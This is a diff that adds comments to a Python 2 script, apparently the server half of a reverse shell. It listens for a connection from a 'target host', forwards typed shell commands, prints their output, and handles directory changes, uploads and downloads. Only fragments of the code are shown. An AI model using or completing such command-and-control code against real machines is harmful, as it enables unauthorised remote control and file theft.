@@ -4,11 +4,13 @@ import socket
 import json
 import base64
 
+#Sends data to target host using json library
 def reliable_send(data):
         json_data = json.dumps(data)
 #       json_data =json.dumps(data.decode('utf-8'))
         target.send(json_data)
 
+#Prints out output of commands on target	
 def reliable_recv():
         data = ""
         while True:
@@ -18,7 +20,9 @@ def reliable_recv():
                 
                 except ValueError:
                         continue
-
+			
+#Takes in command to be forwarded to the target host, and sends it on. Special cases for changing directory, uploading, and downloading locally
+#which is checked by verifying the first several characters in a command
 def shell():
         while True:
                 command = raw_input("* Shell#~%s: " + str(ip))
@@ -43,6 +47,7 @@ def shell():
                         result= reliable_recv()
                         print(result)
 
+#Initializes the server and waits to receive a connection from the target host.
 def server():
         global s
         global ip
